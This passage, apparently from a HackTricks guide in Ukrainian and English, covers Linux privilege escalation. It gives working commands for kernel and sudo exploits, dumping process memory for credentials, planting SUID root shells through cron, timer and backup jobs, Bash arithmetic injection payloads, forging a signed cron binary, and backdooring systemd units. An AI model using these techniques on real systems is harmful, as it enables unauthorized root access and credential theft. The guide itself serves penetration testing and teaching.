# Підвищення привілеїв у Linux

{{#include ../../banners/hacktricks-training.md}}

## Системна інформація

### Інформація про ОС

Почнемо з отримання деяких відомостей про ОС, що працює
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

If you **маєте права на запис у будь-яку теку всередині змінної `PATH`** you may be able to hijack some libraries or binaries:
```bash
echo $PATH
```
### Інформація про середовище

Цікава інформація, паролі або API keys у змінних середовища?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи є якийсь exploit, який можна використати для підвищення привілеїв
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel і деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) і [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де ви можете знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії kernel з цього вебсайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо, ваша версія kernel згадується в якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit підходить.

Додаткові techniques exploitation kernel:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Версія Sudo

На основі вразливих версій sudo, що з’являються в:
```bash
searchsploit sudo
```
Можна перевірити, чи вразлива версія sudo, за допомогою цього grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють локальним користувачам без привілеїв підвищити свої привілеї до root через опцію sudo `--chroot`, коли файл `/etc/nsswitch.conf` використовується з каталогу, контрольованого користувачем.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойту переконайтеся, що ваша версія `sudo` є вразливою і що вона підтримує функцію `chroot`.

Для отримання додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Обхід host-based rules у Sudo (CVE-2025-32462)

Sudo до 1.9.17p1 (заявлений діапазон уражених версій: **1.8.8–1.9.17**) може оцінювати host-based sudoers rules, використовуючи **hostname, переданий користувачем** через `sudo -h <host>`, замість **реального hostname**. Якщо sudoers надає ширші привілеї на іншому host, ви можете **spoof** цей host локально.

Вимоги:
- Вразлива версія sudo
- Host-specific sudoers rules (host не є ні поточним hostname, ні `ALL`)

Приклад шаблону sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Експлуатація шляхом підміни дозволеного хоста:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Якщо розв’язання підробленого імені блокується, додайте його до `/etc/hosts` або використайте hostname, який уже з’являється в logs/configs, щоб уникнути DNS lookups.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Перевірка підпису Dmesg не вдалася

Перевірте **smasher2 box of HTB** для **example** того, як цю вразливість можна було б експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткове системне перерахування
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічіть можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Якщо ви всередині контейнера, почніть із наступного розділу container-security, а потім перейдіть до runtime-specific abuse сторінок:


{{#ref}}
container-security/
{{#endref}}

## Drives

Перевірте **що змонтовано і не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити наявність private info
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи **будь-який компілятор встановлено**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на схожій)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Вразливе програмне забезпечення встановлене

Перевірте **версію встановлених пакетів і сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна використати для підвищення привілеїв…\
Рекомендується вручну перевіряти версію найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH-доступ до машини, ви також можете використати **openVAS**, щоб перевірити встановлене на машині застаріле та вразливе ПЗ.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка здебільшого буде марною, тому рекомендується використовувати такі застосунки, як OpenVAS або подібні, які перевірять, чи є якась встановлена версія програмного забезпечення вразливою до відомих exploits_

## Processes

Перегляньте, **які процеси** виконуються, і перевірте, чи має якийсь процес **більше привілеїв, ніж повинен** (можливо, tomcat виконується від root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів**, можливо, ви можете когось перезаписати.

### Cross-user parent-child chains

Дочірній процес, що працює під **іншим користувачем**, ніж його батьківський процес, не є автоматично шкідливим, але це корисний **triage signal**. Деякі переходи очікувані (`root` створює service user, login managers створюють session processes), але незвичайні ланцюжки можуть виявити wrappers, debug helpers, persistence або слабкі межі довіри runtime.

Швидкий огляд:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Якщо ви знаходите несподіваний chain, перевірте командний рядок батьківського процесу та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, helper scripts, робочий каталог, writable arguments). У кількох реальних privesc paths сам child не був writable, але **parent-controlled config** або helper chain — був.

### Deleted executables and deleted-open files

Runtime artifacts часто все ще доступні **після deletion**. Це корисно як для privilege escalation, так і для відновлення evidence з процесу, який уже відкрив sensitive files.

Перевірте deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес усе ще виконує старий образ бінарного файла з пам’яті. Це сильний сигнал для перевірки, тому що:

- видалений виконуваний файл може містити цікаві рядки або credentials
- запущений процес може все ще надавати корисні file descriptors
- видалений privileged binary може вказувати на нещодавнє втручання або спробу cleanup

Зберіть globally deleted-open files:
```bash
lsof +L1
```
Якщо знайдете цікавий дескриптор, відновіть його безпосередньо:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Це особливо цінно, коли процес все ще має відкритий видалений secret, script, database export або flag file.

### Process monitoring

Ви можете використовувати інструменти на кшталт [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно, щоб виявляти вразливі процеси, які виконуються часто або коли виконуються певні умови.

### Process memory

Деякі сервіси сервера зберігають **credentials у відкритому вигляді в memory**.\
Зазвичай вам знадобляться **root privileges**, щоб читати memory процесів, які належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти ще більше credentials.\
Однак пам’ятайте, що **як звичайний користувач ви можете читати memory процесів, які належать вам**.

> [!WARNING]
> Зверніть увагу, що нині більшість машин **не дозволяють ptrace за замовчуванням**, а це означає, що ви не можете дампити інші процеси, які належать вашому непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ керує доступністю ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можна debug, якщо вони мають той самий uid. Це класичний спосіб роботи ptracing.
> - **kernel.yama.ptrace_scope = 1**: debug можна лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: лише admin може використовувати ptrace, оскільки для цього потрібна capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жодні процеси не можна trace за допомогою ptrace. Після встановлення потрібен reboot, щоб знову увімкнути ptracing.

#### GDB

Якщо у вас є доступ до memory FTP service (наприклад), ви можете отримати Heap і шукати всередині нього credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого process ID, **maps показує, як memory відображається у** virtual address space цього process; також він показує **permissions кожної mapped region**. Псевдофайл **mem** **розкриває саму memory process**. З файлу **maps** ми знаємо, які **memory regions є readable** та їхні offsets. Ми використовуємо цю інформацію, щоб **перейти в mem file і дампити всі readable regions** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам’яті системи, а не до віртуальної пам’яті. До віртуального адресного простору ядра можна отримати доступ за допомогою /dev/kmem.\
Зазвичай, `/dev/mem` доступний для читання лише **root** і групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це Linux-переосмислення класичного інструмента ProcDump із набору Sysinternals для Windows. Отримати його можна тут: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Щоб зняти дамп пам’яті процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Можна зробити dump процесу (див. попередні розділи, щоб знайти різні способи дампу пам’яті процесу) і шукати credentials всередині пам’яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам’яті** та з деяких **добре відомих файлів**. Для коректної роботи йому потрібні root privileges.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Якщо веб-панель “Crontab UI” (alseambusher/crontab-ui) працює як root і прив’язана лише до loopback, її все одно можна досягти через SSH local port-forwarding і створити privileged job для escalation.

Typical chain
- Виявити порт лише на loopback (наприклад, 127.0.0.1:8000) і Basic-Auth realm через `ss -ntlp` / `curl -v localhost:8000`
- Знайти credentials в operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створіть high-priv job і запустіть його негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуй його:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Не запускайте Crontab UI як root; обмежте його окремим користувачем і мінімальними правами
- Прив’яжіть до localhost і додатково обмежте доступ через firewall/VPN; не використовуйте повторно паролі
- Уникайте вбудовування secrets у unit files; використовуйте secret stores або root-only EnvironmentFile
- Увімкніть audit/logging для виконання job за запитом



Перевірте, чи вразливе якесь заплановане завдання. Можливо, ви можете скористатися script, що виконується root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Якщо використовується `run-parts`, перевірте, які імена насправді будуть виконані:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Це дозволяє уникнути false positives. Writable periodic directory корисний лише якщо ім’я вашого payload збігається з локальними правилами `run-parts`.

### Cron path

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо всередині цього crontab root користувач намагається виконати якусь command або script без встановлення path. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використовуючи:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Якщо скрипт виконується root і має “**\***” всередині команди, ви можете використати це, щоб змусити виконатися неочікувані речі (наприклад, privesc). Example:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шлях, як** _**/some/path/\***_ **, це не вразливо (навіть** _**./\***_ **не є).**

Прочитайте наступну сторінку для інших tricks експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection у cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation у ((...)), $((...)) і let. Якщо root cron/parser читає недовірені поля log і передає їх у arithmetic context, attacker може inject-ити command substitution $(...) that executes як root when the cron runs.

- Чому це працює: У Bash expansions відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (запускаючи команду), а потім решта числового `0` використовується для arithmetic, тож script продовжується без помилок.

- Типовий vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Додайте attacker-controlled text у parsed log так, щоб numeric-looking field містив command substitution і закінчувався цифрою. Переконайтеся, що ваша команда не друкує в stdout (або перенаправте його), щоб arithmetic залишався valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете змінити cron script**, який виконується root, ви можете дуже легко отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, виконуваний root, використовує **каталог, до якого у вас є повний доступ**, можливо, буде корисно видалити цю папку і **створити символьне посилання на іншу папку**, що містить скрипт, контрольований вами
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Перевірка symlink і безпечніша робота з файлами

Під час аналізу privileged scripts/binaries, які читають або записують файли за шляхом, перевіряй, як обробляються links:

- `stat()` слідує за symlink і повертає metadata цілі.
- `lstat()` повертає metadata самого link.
- `readlink -f` і `namei -l` допомагають визначити кінцеву ціль і показують permissions кожного компонента шляху.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Для defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Також можна використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це моніторитиме й показуватиме кожен процес, що запускається).

### Root backups that preserve attacker-set mode bits (pg_basebackup)

Якщо root-owned cron обгортає `pg_basebackup` (або будь-яке рекурсивне копіювання) щодо каталогу бази даних, у який ви можете записувати, ви можете підкласти **SUID/SGID binary**, який буде знову скопійований як **root:root** з тими самими mode bits у вихідний backup.

Типовий процес виявлення (як low-priv DB user):
- Використайте `pspy`, щоб помітити root cron, який запускає щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` щохвилини.
- Переконайтеся, що source cluster (наприклад, `/var/lib/postgresql/14/main`) доступний для запису вам, а destination (`/opt/backups/current`) стає owned by root після виконання job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Це працює, тому що `pg_basebackup` зберігає біти режиму файлів під час копіювання кластера; коли його запускає root, файли призначення успадковують **root ownership + attacker-chosen SUID/SGID**. Будь-яка подібна привілейована backup/copy routine, яка зберігає permissions і записує в executable location, є вразливою.

### Invisible cron jobs

Можливо створити cronjob, **додавши carriage return після коментаря** (без newline character), і cron job працюватиме. Приклад (зверніть увагу на carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Щоб виявити такий тип прихованого входу, перевіряйте cron-файли за допомогою інструментів, що відображають керівні символи:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Перевірте, чи можете ви записувати будь-який `.service` файл; якщо так, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor, коли** service **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться дочекатися перезавантаження машини).\
Наприклад, створіть ваш backdoor всередині `.service` файлу з **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Майте на увазі, що якщо у вас є **права на запис у binary, який виконується service**, ви можете змінити його на backdoor, щоб коли service буде виконано знову, backdoor теж буде виконано.

### systemd PATH - Relative Paths

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **писати** в будь-якій із папок у цьому шляху, ви, можливо, зможете **підвищити привілеї**. Потрібно шукати **відносні шляхи, що використовуються у конфігураційних** файлах сервісів, таких як:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Тоді створіть **виконуваний файл** з **тим самим ім’ям, що й бінарник відносного шляху**, у папці systemd PATH, куди ви можете записувати, і коли службу буде змушено виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor** буде виконано (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете ви використати `sudo -l`).

**Дізнайтеся більше про services за допомогою `man systemd.service`.**

## **Timers**

**Timers** — це файли unit systemd, чиє ім’я закінчується на `**.timer**`, які керують файлами `**.service**` або подіями. **Timers** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку подій календарного часу та монотонних подій часу, і їх можна запускати асинхронно.

Ви можете перелічити всі timers за допомогою:
```bash
systemctl list-timers --all
```
### Writable timers

Якщо ви можете змінити timer, ви можете змусити його виконати деякі існуючі `systemd.unit` (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації ви можете прочитати, що таке Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує записуваний binary**
- Знайти якийсь systemd unit, який **виконує відносний шлях**, і мати **writable privileges** над **systemd PATH** (щоб видати себе за цей executable)

**Дізнайтеся більше про timers за допомогою `man systemd.timer`.**

### **Enabling Timer**

Щоб enable timer, вам потрібні root privileges і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Примітка: **timer** **активується** шляхом створення символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Дізнайтесь більше про sockets за допомогою `man systemd.socket`.** Всередині цього файлу можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції різні, але коротко вони використовуються, щоб **вказати, де socket буде слухати** (шлях до AF_UNIX socket file, IPv4/6 та/або номер порту для прослуховування тощо)
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з’єднання створюється **окремий service instance**, і йому передається лише connection socket. Якщо **false**, усі listening sockets передаються **запущеному service unit**, і для всіх з’єднань створюється лише один service unit. Це значення ігнорується для datagram sockets і FIFOs, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням false**. З міркувань продуктивності рекомендується писати нові daemons лише так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймає одну або кілька командних стрічок, які **виконуються до** або **після** того, як listening **sockets**/FIFOs відповідно **створюються** і прив’язуються. Перший токен командного рядка має бути абсолютним filename, після чого йдуть аргументи для process.
- `ExecStopPre`, `ExecStopPost`: Додаткові **commands**, які **виконуються до** або **після** того, як listening **sockets**/FIFOs відповідно **закриваються** і видаляються.
- `Service`: Вказує ім’я **service** unit, який потрібно **активувати** на **вхідний трафік**. Це налаштування дозволено лише для sockets з `Accept=no`. За замовчуванням використовується service з тим самим ім’ям, що й socket (із заміною суфікса). У більшості випадків використовувати цю опцію не потрібно.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Another high-impact misconfiguration is:

- a socket unit with `Accept=no` and `Service=<name>.service`
- the referenced service unit is missing
- an attacker can write into `/etc/systemd/system` (or another unit search path)

In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
